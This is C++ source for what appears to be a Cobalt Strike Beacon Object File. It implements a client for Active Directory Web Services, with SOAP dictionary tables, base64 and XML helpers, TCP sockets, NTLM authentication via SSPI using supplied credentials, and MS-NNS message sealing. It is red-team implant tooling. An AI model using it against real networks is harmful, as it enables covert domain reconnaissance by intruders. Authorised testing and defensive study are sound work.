#include <Windows.h>
#include "base\helpers.h"

#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include "base\mock.h"
#define KERNEL32$GetProcAddress GetProcAddress
#define KERNEL32$LoadLibraryA   LoadLibraryA
#define KERNEL32$GetModuleHandleA GetModuleHandleA
#define KERNEL32$GetProcessHeap GetProcessHeap
#define KERNEL32$HeapFree HeapFree
#define KERNEL32$HeapAlloc HeapAlloc
#define KERNEL32$OutputDebugStringA OutputDebugStringA
#endif

extern "C" {
#include "beacon.h"
#include "sleepmask.h"

	// Declare LoadLibraryA
	DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);

	// Declare GetProcAddress
	DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
	DECLSPEC_IMPORT void WINAPI KERNEL32$OutputDebugStringA(LPCSTR lpOutputString);
	DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetProcessHeap();
	DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
	DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);



	typedef unsigned char      u8;
	typedef unsigned short     u16;
	typedef unsigned int       u32;
	typedef unsigned long long u64;
	typedef signed char        i8;
	typedef short              i16;
	typedef int                i32;
	typedef long long          i64;
	typedef u64                uptr;   /* pointer-sized unsigned */
	typedef i64                iptr;
	typedef u64                size_t;
	typedef i64                ssize_t;
	typedef struct { const char* str; u32 idx; } DictEntry;
	static const struct { const char* str; u32 idx; } kStaticDict[] = {
		{"mustUnderstand",                                    0x000},
		{"Envelope",                                          0x002},
		{"http://www.w3.org/2003/05/soap-envelope",           0x004},
		{"http://schemas.xmlsoap.org/ws/2004/08/addressing",  0x04E},
		{"http://www.w3.org/2005/08/addressing",              0x006},
		{"Header",                                            0x008},
		{"Action",                                            0x00A},
		{"To",                                                0x00C},
		{"Body",                                              0x00E},
		{"http://www.w3.org/2005/08/addressing/anonymous",    0x014},
		{"http://www.w3.org/2005/08/addressing/identity",     0x098},
		{"MessageID",                                         0x01A},
		{"Address",                                           0x02A},
		{"ReplyTo",                                           0x02C},
		{"type",                                              0x378},
		{"http://www.w3.org/2001/XMLSchema-instance",         0x372},
		{"http://www.w3.org/2001/XMLSchema",                  0x374},
		{"Fault",                                             0x086},
		{"Code",                                              0x08E},
		{"Reason",                                            0x090},
		{"Text",                                              0x092},
		{"Value",                                             0x09A},
		{"Subcode",                                           0x09C},
		{"RelatesTo",                                         0x012},
		{"http://www.w3.org/2005/08/addressing/role",         0x016},
		{"http://www.w3.org/2005/08/addressing/fault",        0x01C},
		{"http://www.w3.org/2005/08/addressing/reply",        0x01E},
		{"http://www.w3.org/2005/08/addressing/none",         0x020},
		{"http://schemas.xmlsoap.org/ws/2004/08/addressing",  0x04E},
		{NULL, 0}
	};

	//#define NULL nullptr
#define TRUE  1
#define FALSE 0
	typedef int BOOL;

	/* ─── Win32 handle / socket types (avoid windows.h) ─────────────────────── */
	typedef void* HANDLE;
	typedef uptr    SOCKET;
#define INVALID_SOCKET ((SOCKET)(~0ULL))
#define INVALID_HANDLE ((HANDLE)(~0ULL))

	/* ─── SSPI opaque handle structs (security.h layout) ────────────────────── */
	typedef struct { uptr dwLower; uptr dwUpper; } SecHandle;
	typedef SecHandle CredHandle;
	typedef SecHandle CtxtHandle;
	typedef i64 TimeStamp;

	typedef struct {
		u32  cbBuffer;
		u32  BufferType;
		void* pvBuffer;
	} SecBuffer;
#define SECBUFFER_TOKEN        2
#define SECBUFFER_DATA         1
#define SECBUFFER_STREAM_HEADER 7
#define SECBUFFER_STREAM_TRAILER 6

	typedef struct { u32 ulVersion; u32 cBuffers; SecBuffer* pBuffers; } SecBufferDesc;
#define SECBUFFER_VERSION 0

#define SEC_E_OK                0x00000000L
#define SEC_I_CONTINUE_NEEDED   0x00090312L
#define SEC_I_COMPLETE_NEEDED   0x00090313L
#define SEC_I_COMPLETE_AND_CONTINUE 0x00090314L
#define ISC_REQ_SEQUENCE_DETECT 0x00000008
#define ISC_REQ_CONFIDENTIALITY 0x00000010
#define ISC_REQ_CONNECTION      0x00000800
#define ISC_REQ_REPLAY_DETECT   0x00000004
#define ISC_REQ_INTEGRITY       0x00010000
#define SECPKG_CRED_OUTBOUND    2
#define SEC_WINNT_AUTH_IDENTITY_ANSI 1


	typedef i32(__stdcall* PFN_AcquireCredHandle)(char*, char*, u32, void*,
		void*, void*, void*, CredHandle*, TimeStamp*);
	typedef i32(__stdcall* PFN_InitSecCtx)(CredHandle*, CtxtHandle*, char*,
		u32, u32, u32, SecBufferDesc*, u32, CtxtHandle*, SecBufferDesc*,
		u32*, TimeStamp*);
	typedef i32(__stdcall* PFN_EncryptMsg)(CtxtHandle*, u32, SecBufferDesc*, u32);
	typedef i32(__stdcall* PFN_DecryptMsg)(CtxtHandle*, SecBufferDesc*, u32, u32*);
	typedef i32(__stdcall* PFN_QueryCtxAttr)(CtxtHandle*, u32, void*);
	typedef i32(__stdcall* PFN_FreeCredHandle)(CredHandle*);
	typedef i32(__stdcall* PFN_DeleteSecCtx)(CtxtHandle*);

#define SECPKG_ATTR_SIZES 0
	typedef struct {
		u32 cbMaxToken;
		u32 cbMaxSignature;
		u32 cbBlockSize;
		u32 cbSecurityTrailer;
	} SecPkgContext_Sizes;

	/* WinSock */
	/*  typedef struct { i16 family; u16 port; u32 addr; u8 pad[8]; } sockaddr_in;*/
	typedef struct { i16 family; u16 port; u32 flowinfo; u8 addr[16]; u32 scope; } sockaddr_in6;
	/* typedef struct { i16 family; u8 data[14]; } sockaddr;*/

	typedef struct {
		u32 ai_flags; i32 ai_family; i32 ai_socktype; i32 ai_protocol;
		size_t ai_addrlen; char* ai_canonname; sockaddr* ai_addr;
		void* ai_next;
	} addrinfo;

	typedef i32(__stdcall* PFN_WSAStartup)(u16, void*);
	typedef void(__stdcall* PFN_WSACleanup)(void);
	typedef SOCKET(__stdcall* PFN_socket)(i32, i32, i32);
	typedef i32(__stdcall* PFN_connect)(SOCKET, const sockaddr*, i32);
	typedef i32(__stdcall* PFN_send)(SOCKET, const char*, i32, i32);
	typedef i32(__stdcall* PFN_recv)(SOCKET, char*, i32, i32);
	typedef i32(__stdcall* PFN_setsockopt)(SOCKET, i32, i32, const char*, i32);
	typedef i32(__stdcall* PFN_closesocket)(SOCKET);
	typedef i32(__stdcall* PFN_getaddrinfo)(const char*, const char*, const addrinfo*, addrinfo**);
	typedef void(__stdcall* PFN_freeaddrinfo)(addrinfo*);
	typedef i32(__stdcall* PFN_select)(i32, void*, void*, void*, void*);
	typedef i32(__stdcall* PFN_WSAGetLastError)(void);
	typedef i32(__stdcall* PFN_ioctlsocket)(SOCKET, i32, u32*);

	/* Kernel32 */
	typedef HANDLE(__stdcall* PFN_GetProcAddress)(HANDLE, const char*);
	typedef HANDLE(__stdcall* PFN_LoadLibraryA)(const char*);
	typedef void(__stdcall* PFN_HeapFree)(HANDLE, u32, void*);
	typedef void* (__stdcall* PFN_HeapAlloc)(HANDLE, u32, size_t);
	typedef HANDLE(__stdcall* PFN_GetProcessHeap)(void);
	typedef void(__stdcall* PFN_RtlZeroMemory)(void*, size_t);
	typedef u32(__stdcall* PFN_GetTickCount)(void);



	size_t adws_strlen(const char* s) {
		size_t n = 0; while (s[n]) n++; return n;
	}
	static void adws_memcpy(void* dst, const void* src, size_t n) {
		u8* d = (u8*)dst; const u8* s = (const u8*)src;
		while (n--) *d++ = *s++;
	}
	static void adws_memset(void* dst, u8 v, size_t n) {
		u8* d = (u8*)dst; while (n--) *d++ = v;
	}
	static int adws_memcmp(const void* a, const void* b, size_t n) {
		const u8* p = (const u8*)a, * q = (const u8*)b;
		while (n--) { if (*p != *q) return (int)*p - (int)*q; p++; q++; }
		return 0;
	}
	static int adws_strcmp(const char* a, const char* b) {
		while (*a && *a == *b) { a++; b++; }
		return (unsigned char)*a - (unsigned char)*b;
	}
	static char adws_tolower(char c) {
		return (c >= 'A' && c <= 'Z') ? (char)(c + 32) : c;
	}
	static int adws_strcasecmp(const char* a, const char* b) {
		while (*a && adws_tolower(*a) == adws_tolower(*b)) { a++; b++; }
		return (unsigned char)adws_tolower(*a) - (unsigned char)adws_tolower(*b);
	}

	/* ─── Dynamic heap (wraps HeapAlloc/HeapFree) --- */

	static HANDLE g_heap;
	static PFN_HeapAlloc  pfn_HeapAlloc;
	static PFN_HeapFree   pfn_HeapFree;

	static void* adws_alloc(size_t n) {
		//DFR_LOCAL(KERNEL32, HeapAlloc);
		return BeaconVirtualAlloc(NULL, n, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	}
	static void adws_free(void* p) {

		if (p) BeaconVirtualFree(p, 0, MEM_RELEASE);
	}
	/* realloc: alloc + copy + free old */
	static void* adws_realloc(void* old_ptr, size_t old_len, size_t new_len) {
		void* p = adws_alloc(new_len);
		if (!p) return NULL;
		if (old_ptr) {
			adws_memcpy(p, old_ptr, old_len < new_len ? old_len : new_len);
			adws_free(old_ptr);
		}
		return p;
	}

	/* ─── Dynamic byte buffer ---──────────────── */

	typedef struct {
		u8* data;
		size_t len;
		size_t cap;
	} Buf;

	static int buf_reserve(Buf* b, size_t extra) {
		size_t need = b->len + extra;
		if (need <= b->cap) return TRUE;
		size_t newcap = b->cap ? b->cap * 2 : 256;
		while (newcap < need) newcap *= 2;
		void* p = adws_realloc(b->data, b->cap, newcap);
		if (!p) return FALSE;
		b->data = (u8*)p; b->cap = newcap;
		return TRUE;
	}
	static int buf_push(Buf* b, u8 byte) {
		if (!buf_reserve(b, 1)) return FALSE;
		b->data[b->len++] = byte; return TRUE;
	}
	static int buf_append(Buf* b, const u8* src, size_t n) {
		if (!buf_reserve(b, n)) return FALSE;
		adws_memcpy(b->data + b->len, src, n); b->len += n; return TRUE;
	}
	static int buf_append_str(Buf* b, const char* s) {
		//KERNEL32$OutputDebugStringA("here?\n");
		return buf_append(b, (const u8*)s, adws_strlen(s));
	}
	static void buf_free(Buf* b) { adws_free(b->data); b->data = NULL; b->len = 0; b->cap = 0; }
	static Buf buf_new(void) { Buf b; b.data = nullptr; b.len = 0; b.cap = 0; return b; }

	/* ─── VarInt (LEB128 / MC-NMF MBI) ---────── */

	static int varint_encode(Buf* out, u32 value) {
		do {
			u8 b = (u8)(value & 0x7F);
			value >>= 7;
			if (value) b |= 0x80;
			if (!buf_push(out, b)) return FALSE;
		} while (value);
		return TRUE;
	}
	static u32 varint_decode(const u8* data, size_t len, size_t* consumed) {
		u32 value = 0; int shift = 0; size_t i = 0;
		for (; i < len && shift < 35; i++, shift += 7) {
			u8 b = data[i];
			value |= (u32)(b & 0x7F) << shift;
			if (!(b & 0x80)) { *consumed = i + 1; return value; }
		}
		*consumed = 0; return 0; /* error */
	}

	/* ─── Base64 ------ */



	static int base64_encode(Buf* out, const u8* src, size_t len) {
		const char kB64Alph[] =
			"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
		for (size_t i = 0; i < len; i += 3) {
			u32 v = (u32)src[i] << 16;
			if (i + 1 < len) v |= (u32)src[i + 1] << 8;
			if (i + 2 < len) v |= (u32)src[i + 2];
			if (!buf_push(out, (u8)kB64Alph[(v >> 18) & 0x3F])) return FALSE;
			if (!buf_push(out, (u8)kB64Alph[(v >> 12) & 0x3F])) return FALSE;
			if (!buf_push(out, (u8)(i + 1 < len ? kB64Alph[(v >> 6) & 0x3F] : '='))) return FALSE;
			if (!buf_push(out, (u8)(i + 2 < len ? kB64Alph[(v) & 0x3F] : '='))) return FALSE;
		}
		return TRUE;
	}

	static u8 b64_char(u8 c) {
		if (c >= 'A' && c <= 'Z') return c - 'A';
		if (c >= 'a' && c <= 'z') return c - 'a' + 26;
		if (c >= '0' && c <= '9') return c - '0' + 52;
		if (c == '+') return 62; if (c == '/') return 63; return 0xFF;
	}
	static int base64_decode(Buf* out, const char* s, size_t len) {
		u32 buf = 0; int bits = 0;
		for (size_t i = 0; i < len; i++) {
			if (s[i] == '=') break;
			u8 v = b64_char((u8)s[i]);
			if (v == 0xFF) continue;
			buf = (buf << 6) | v; bits += 6;
			if (bits >= 8) { bits -= 8; if (!buf_push(out, (u8)((buf >> bits) & 0xFF))) return FALSE; }
		}
		return TRUE;
	}

	/* ─── XML / string escaping ---────────────── */

	static int xml_escape_str(Buf* out, const char* s, size_t len) {
		for (size_t i = 0; i < len; i++) {
			char c = s[i];
			if (c == '&') { if (!buf_append_str(out, "&amp;")) return FALSE; }
			else if (c == '<') { if (!buf_append_str(out, "&lt;"))  return FALSE; }
			else if (c == '>') { if (!buf_append_str(out, "&gt;"))  return FALSE; }
			else if (c == '"') { if (!buf_append_str(out, "&quot;"))return FALSE; }
			else if (c == '\'') { if (!buf_append_str(out, "&apos;"))return FALSE; }
			else { if (!buf_push(out, (u8)c)) return FALSE; }
		}
		return TRUE;
	}
	static void xml_unescape_inplace(char* s, size_t* lenp) {
		/* simple in-place XML entity decode */
		char* w = s; const char* r = s; const char* end = s + *lenp;
		while (r < end) {
			if (*r == '&') {
				if (r + 4 <= end && r[1] == 'l' && r[2] == 't' && r[3] == ';') { *w++ = '<'; r += 4; }
				else if (r + 4 <= end && r[1] == 'g' && r[2] == 't' && r[3] == ';') { *w++ = '>';r += 4; }
				else if (r + 5 <= end && r[1] == 'a' && r[2] == 'm' && r[3] == 'p' && r[4] == ';') { *w++ = '&';r += 5; }
				else if (r + 6 <= end && r[1] == 'q' && r[2] == 'u' && r[3] == 'o' && r[4] == 't' && r[5] == ';') { *w++ = '"';r += 6; }
				else if (r + 6 <= end && r[1] == 'a' && r[2] == 'p' && r[3] == 'o' && r[4] == 's' && r[5] == ';') { *w++ = '\'';r += 6; }
				else *w++ = *r++;
			}
			else *w++ = *r++;
		}
		*lenp = (size_t)(w - s);
	}

	/* ─── Tiny itoa (unsigned) ---──────────────── */

	static int u32_to_str(u32 v, char* buf, size_t buflen) {
		if (!buflen) return 0;
		char tmp[12]; int n = 0;
		if (v == 0) { tmp[n++] = '0'; }
		else { while (v) { tmp[n++] = '0' + (v % 10); v /= 10; } }
		/* reverse */
		for (int i = 0, j = n - 1;i < j;i++, j--) { char t = tmp[i];tmp[i] = tmp[j];tmp[j] = t; }
		if ((size_t)n + 1 > buflen) return 0;
		adws_memcpy(buf, tmp, (size_t)n); buf[n] = 0; return n;
	}
	static int u64_to_hex(u64 v, char* buf, int width) {
		/* writes exactly `width` hex chars + NUL, right-justified, zero-padded */
		const char* h = "0123456789ABCDEF";
		for (int i = width - 1;i >= 0;i--) { buf[i] = h[v & 0xF]; v >>= 4; }
		buf[width] = 0; return width;
	}

	/* ─── UUID generation (uses GetTickCount for entropy; not cryptographic) ── */

	static PFN_GetTickCount pfn_GetTickCount;

	static void generate_uuid(char out[37]) {
		/* Produces a pseudo-random version-4 UUID */
		u64 s_state = 0xDEADBEEFCAFEBABEULL;
		/* xorshift64 */
		pfn_GetTickCount = (PFN_GetTickCount)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("kernel32.dll"), "GetTickCount");
		u32 tc = pfn_GetTickCount();
		s_state ^= (u64)tc | ((u64)tc << 32);
		s_state ^= s_state << 13; s_state ^= s_state >> 7; s_state ^= s_state << 17;
		u64 a = s_state;
		s_state ^= s_state << 13; s_state ^= s_state >> 7; s_state ^= s_state << 17;
		u64 b = s_state;
		/* Force version 4 and variant bits */
		a = (a & 0xFFFF0FFFFFFFFFFFULL) | 0x0000400000000000ULL;
		b = (b & 0x3FFFFFFFFFFFFFFFULL) | 0x8000000000000000ULL;
		/* Format: xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx */
		u64_to_hex((a >> 32) & 0xFFFFFFFF, out, 8); out[8] = '-';
		u64_to_hex((a >> 16) & 0xFFFF, out + 9, 4); out[13] = '-';
		u64_to_hex(a & 0xFFFF, out + 14, 4); out[18] = '-';
		u64_to_hex((b >> 48) & 0xFFFF, out + 19, 4); out[23] = '-';
		u64_to_hex((b) & 0xFFFFFFFFFFFFULL, out + 24, 12); out[36] = 0;
	}

	/* ─── WinSock state ---────────────────────── */

	static PFN_WSAStartup     pfn_WSAStartup;
	static PFN_WSACleanup     pfn_WSACleanup;
	static PFN_socket         pfn_socket;
	static PFN_connect        pfn_connect;
	static PFN_send           pfn_send;
	static PFN_recv           pfn_recv;
	static PFN_setsockopt     pfn_setsockopt;
	static PFN_closesocket    pfn_closesocket;
	static PFN_getaddrinfo    pfn_getaddrinfo;
	static PFN_freeaddrinfo   pfn_freeaddrinfo;
	static PFN_select         pfn_select;
	static PFN_WSAGetLastError pfn_WSAGetLastError;
	static PFN_ioctlsocket    pfn_ioctlsocket;

	/* ─── SSPI state ---───────────────────────── */

	static PFN_AcquireCredHandle pfn_AcquireCredHandle;
	static PFN_InitSecCtx        pfn_InitSecCtx;
	static PFN_EncryptMsg        pfn_EncryptMsg;
	static PFN_DecryptMsg        pfn_DecryptMsg;
	static PFN_QueryCtxAttr      pfn_QueryCtxAttr;
	static PFN_FreeCredHandle    pfn_FreeCredHandle;
	static PFN_DeleteSecCtx      pfn_DeleteSecCtx;

	/* ─── TCP socket ---───────────────────────── */

#define SOL_SOCKET   0xFFFF
#define SO_RCVTIMEO  0x1006
#define SO_SNDTIMEO  0x1005
#define SO_KEEPALIVE 0x0008
#define AF_UNSPEC    0
#define SOCK_STREAM  1
#define IPPROTO_TCP  6
#define FIONBIO      0x8004667EU
#define TCP_NODELAY  1


	static int tcp_connect(const char* host, u16 port, int timeout_ms, SOCKET* sock_out) {
		pfn_recv = (PFN_recv)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("Ws2_32.dll"), "recv");
		char portbuf[8]; u32_to_str(port, portbuf, sizeof(portbuf));
		addrinfo hints; adws_memset(&hints, 0, sizeof(hints));
		hints.ai_family = AF_UNSPEC;
		hints.ai_socktype = SOCK_STREAM;
		addrinfo* res = NULL;
		pfn_WSAStartup = (PFN_WSAStartup)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("Ws2_32.dll"), "WSAStartup");
		u8 wsa_data[408]; adws_memset(wsa_data, 0, sizeof(wsa_data));
		if (pfn_WSAStartup(0x0202 /*2.2*/, wsa_data) != 0) return FALSE;
		pfn_getaddrinfo = (PFN_getaddrinfo)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("Ws2_32.dll"), "getaddrinfo");
		pfn_socket = (PFN_socket)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("Ws2_32.dll"), "socket");
		pfn_connect = (PFN_connect)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("Ws2_32.dll"), "connect");
		pfn_ioctlsocket = (PFN_ioctlsocket)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("Ws2_32.dll"), "ioctlsocket");
		pfn_freeaddrinfo = (PFN_freeaddrinfo)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("Ws2_32.dll"), "freeaddrinfo");
		pfn_select = (PFN_select)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("Ws2_32.dll"), "select");
		pfn_setsockopt = (PFN_setsockopt)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("Ws2_32.dll"), "setsockopt");
		pfn_closesocket = (PFN_closesocket)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("Ws2_32.dll"), "closesocket");
		INT ddfsdf = pfn_getaddrinfo(host, portbuf, &hints, &res);
		if (ddfsdf != 0 || !res) return FALSE;
		SOCKET s = pfn_socket(res->ai_family, res->ai_socktype, res->ai_protocol);
		if (s == INVALID_SOCKET) { pfn_freeaddrinfo(res); return FALSE; }
		/* non-blocking connect with timeout */
		u32 nb = 1; pfn_ioctlsocket(s, FIONBIO, &nb);
		pfn_connect(s, res->ai_addr, (i32)res->ai_addrlen);
		pfn_freeaddrinfo(res);
		/* select for writable */
		struct { u32 count; SOCKET fds[1]; } wfds, efds;
		wfds.count = 1; wfds.fds[0] = s; efds.count = 1; efds.fds[0] = s;
		struct { i32 sec; i32 usec; } tv;
		tv.sec = timeout_ms / 1000; tv.usec = (timeout_ms % 1000) * 1000;
		i32 sr = pfn_select(0, NULL, &wfds, &efds, &tv);
		nb = 0; pfn_ioctlsocket(s, FIONBIO, &nb);
		if (sr <= 0) { pfn_closesocket(s); return FALSE; }
		/* apply timeout for read/write */
		u32 t = (u32)timeout_ms;
		pfn_setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char*)&t, sizeof(t));
		pfn_setsockopt(s, SOL_SOCKET, SO_SNDTIMEO, (char*)&t, sizeof(t));
		*sock_out = s; return TRUE;
	}

	static int tcp_send_all(SOCKET s, const u8* data, size_t len) {
		pfn_send = (PFN_send)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("Ws2_32.dll"), "send");
		while (len > 0) {
			i32 n = pfn_send(s, (const char*)data, len > 0x7FFFFFFF ? 0x7FFFFFFF : (i32)len, 0);
			if (n <= 0) return FALSE;
			data += n; len -= (size_t)n;
		}
		return TRUE;
	}
	static int tcp_recv_exact(SOCKET s, u8* buf, size_t len) {
		pfn_recv = (PFN_recv)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("Ws2_32.dll"), "recv");
		while (len > 0) {
			i32 n = pfn_recv(s, (char*)buf, len > 0x7FFFFFFF ? 0x7FFFFFFF : (i32)len, 0);
			if (n <= 0) return FALSE;
			buf += n; len -= (size_t)n;
		}
		return TRUE;
	}

	/* ─── SSPI / NTLM Negotiator ---───────────── */

	typedef struct {
		CredHandle cred;
		CtxtHandle ctx;
		int        ctx_valid;
		int        complete;
		char* target_name; /* "host/fqdn" */
		SecPkgContext_Sizes sizes;
		u32        send_seq;   // ← add this
		u32        recv_seq;   // ← add this
	} NtlmCtx;

	static int ntlm_init(NtlmCtx* n, const char* domain, const char* username,
		const char* password, const char* fqdn) {
		adws_memset(n, 0, sizeof(*n));

		/* Build target name "host/<fqdn>" on heap */
		size_t flen = adws_strlen(fqdn);
		n->target_name = (char*)adws_alloc(5 + flen + 1);
		if (!n->target_name) return FALSE;
		const char pfx[] = { 'h','o','s','t','/' };
		adws_memcpy(n->target_name, pfx, 5);
		adws_memcpy(n->target_name + 5, fqdn, flen + 1);

		SEC_WINNT_AUTH_IDENTITY_A identity;
		adws_memset(&identity, 0, sizeof(identity));
		identity.User = (u8*)username;
		identity.UserLength = (u32)adws_strlen(username);
		identity.Domain = domain ? (u8*)domain : NULL;
		identity.DomainLength = domain ? (u32)adws_strlen(domain) : 0;
		identity.Password = (u8*)password;
		identity.PasswordLength = (u32)adws_strlen(password);
		identity.Flags = SEC_WINNT_AUTH_IDENTITY_ANSI;

		const char pkg[] = { 'N','T','L','M',0 };
		TimeStamp exp;
		pfn_AcquireCredHandle = (PFN_AcquireCredHandle)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("secur32.dll"), "AcquireCredentialsHandleA");
		i32 st = pfn_AcquireCredHandle(NULL, (char*)pkg, SECPKG_CRED_OUTBOUND, NULL,
			&identity, NULL, NULL, &n->cred, &exp);
		return (st == SEC_E_OK);
	}

	static int ntlm_get_token(NtlmCtx* n, const u8* in, size_t in_len,
		Buf* out_token) {

		HANDLE hHeap = KERNEL32$GetProcessHeap();

		// 3. Allocate 65536 bytes on the heap (using flag 8 for HEAP_ZERO_MEMORY)
		u8* out_buf = (u8*)KERNEL32$HeapAlloc(hHeap, 8, 65536);
		SecBuffer in_bufs[1], out_bufs[1];
		adws_memset(in_bufs, 0, sizeof(in_bufs));
		adws_memset(out_bufs, 0, sizeof(out_bufs));

		SecBufferDesc in_desc, out_desc;
		adws_memset(&in_desc, 0, sizeof(in_desc));
		adws_memset(&out_desc, 0, sizeof(out_desc));

		// out_bufs[0].cbBuffer = sizeof(out_buf);
		out_bufs[0].cbBuffer = 65536;
		out_bufs[0].BufferType = SECBUFFER_TOKEN;
		out_bufs[0].pvBuffer = out_buf;
		out_desc.ulVersion = SECBUFFER_VERSION;
		out_desc.cBuffers = 1;
		out_desc.pBuffers = out_bufs;

		SecBufferDesc empty_desc;
		SecBuffer empty_buf[1];
		empty_buf[0].cbBuffer = 0;
		empty_buf[0].BufferType = 0;
		empty_buf[0].pvBuffer = NULL;
		empty_desc.ulVersion = SECBUFFER_VERSION;
		empty_desc.cBuffers = 1;
		empty_desc.pBuffers = empty_buf;

		SecBufferDesc* p_in_desc = NULL;
		if (in && in_len) {
			in_bufs[0].cbBuffer = (u32)in_len;
			in_bufs[0].BufferType = SECBUFFER_TOKEN;
			in_bufs[0].pvBuffer = (void*)in;
			in_desc.ulVersion = SECBUFFER_VERSION;
			in_desc.cBuffers = 1;
			in_desc.pBuffers = in_bufs;
			p_in_desc = &in_desc;
		}

		u32 attrs = 0;
		TimeStamp exp;
		pfn_InitSecCtx = (PFN_InitSecCtx)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("secur32.dll"), "InitializeSecurityContextA");

		i32 st = pfn_InitSecCtx(
			&n->cred,
			n->ctx_valid ? &n->ctx : NULL,
			//,
			n->target_name,
			ISC_REQ_SEQUENCE_DETECT | ISC_REQ_CONFIDENTIALITY | ISC_REQ_CONNECTION
			| ISC_REQ_INTEGRITY | ISC_REQ_REPLAY_DETECT,
			0, 0x00000010 /*SECURITY_NATIVE_DREP*/,
			p_in_desc, 0,
			&n->ctx, &out_desc, &attrs, &exp);
		n->ctx_valid = 1;
		if (st == SEC_E_OK) n->complete = 1;
		if (st != SEC_E_OK && st != SEC_I_CONTINUE_NEEDED && st != SEC_I_COMPLETE_NEEDED &&
			st != SEC_I_COMPLETE_AND_CONTINUE) return FALSE;

		if (!buf_append(out_token, out_buf, out_bufs[0].cbBuffer)) return FALSE;
		pfn_QueryCtxAttr = (PFN_QueryCtxAttr)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("secur32.dll"), "QueryContextAttributesA");
		/* Fetch sizes for seal/unseal */
		if (n->complete) {
			pfn_QueryCtxAttr(&n->ctx, SECPKG_ATTR_SIZES, &n->sizes);


		}
		return TRUE;
	}

	static int ntlm_seal(NtlmCtx* n, const u8* plain, size_t plain_len, Buf* out) {
		/* sealed = [sig(sizes.cbSecurityTrailer)][ciphertext(plain_len)] */
		u32 sig_len = n->sizes.cbSecurityTrailer;
		u8* sig_buf = (u8*)adws_alloc(sig_len);
		u8* dat_buf = (u8*)adws_alloc(plain_len);
		if (!sig_buf || !dat_buf) { adws_free(sig_buf); adws_free(dat_buf); return FALSE; }
		adws_memcpy(dat_buf, plain, plain_len);

		SecBuffer bufs[2];
		SecBufferDesc desc;
		bufs[0].cbBuffer = sig_len; bufs[0].BufferType = SECBUFFER_TOKEN; bufs[0].pvBuffer = sig_buf;
		bufs[1].cbBuffer = (u32)plain_len; bufs[1].BufferType = SECBUFFER_DATA; bufs[1].pvBuffer = dat_buf;
		desc.ulVersion = SECBUFFER_VERSION; desc.cBuffers = 2; desc.pBuffers = bufs;

		pfn_EncryptMsg = (PFN_EncryptMsg)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("secur32.dll"), "EncryptMessage");
		i32 st = pfn_EncryptMsg(&n->ctx, 0, &desc, n->send_seq++);
		int ok = (st == SEC_E_OK);
		if (ok) {
			ok = buf_append(out, sig_buf, sig_len) &&
				buf_append(out, dat_buf, plain_len);
		}
		adws_free(sig_buf); adws_free(dat_buf);
		return ok;
	}

	static int ntlm_unseal(NtlmCtx* n, u8* payload, size_t payload_len, Buf* out) {
		/* payload = sig_len bytes sig + rest is ciphertext */
		u32 sig_len = n->sizes.cbSecurityTrailer;
		if (payload_len < sig_len) return FALSE;
		size_t data_len = payload_len - sig_len;

		SecBuffer bufs[2];
		SecBufferDesc desc;
		bufs[0].cbBuffer = sig_len;     bufs[0].BufferType = SECBUFFER_TOKEN; bufs[0].pvBuffer = payload;
		bufs[1].cbBuffer = (u32)data_len; bufs[1].BufferType = SECBUFFER_DATA; bufs[1].pvBuffer = payload + sig_len;
		desc.ulVersion = SECBUFFER_VERSION; desc.cBuffers = 2; desc.pBuffers = bufs;

		u32 qop = 0;
		pfn_DecryptMsg = (PFN_DecryptMsg)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("secur32.dll"), "DecryptMessage");
		i32 st = pfn_DecryptMsg(&n->ctx, &desc, n->recv_seq++, &qop);
		//////BeaconPrintf(CALLBACK_OUTPUT, "ntlm_unseal: st=0x%08X data_len=%llu\n", (u32)st, data_len);

		if (st != SEC_E_OK) return FALSE;
		return buf_append(out, (u8*)bufs[1].pvBuffer, data_len);
	}

	static void ntlm_free(NtlmCtx* n) {
		pfn_DeleteSecCtx = (PFN_DeleteSecCtx)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("secur32.dll"), "DeleteSecurityContext");
		if (n->ctx_valid) pfn_DeleteSecCtx(&n->ctx);
		pfn_FreeCredHandle = (PFN_FreeCredHandle)KERNEL32$GetProcAddress(KERNEL32$LoadLibraryA("secur32.dll"), "FreeCredentialsHandle");
		pfn_FreeCredHandle(&n->cred);
		adws_free(n->target_name);
		adws_memset(n, 0, sizeof(*n));
	}

	/* ─── NNS session (MS-NNS) ---─────────────── */
	/* NNS data packet: [4-byte LE payload_size][sig][ciphertext]
	   Handshake packet: [msgId][1][0][len_hi][len_lo][token...]  */

#define NNS_IN_PROGRESS 0x16
#define NNS_DONE        0x14
#define NNS_ERROR       0x15

	typedef struct {
		SOCKET    sock;
		NtlmCtx* ntlm;
		u32       max_payload;
		/* reassembly buffer */
		Buf       rbuf;
		size_t    rpos;
	} NnsCtx;

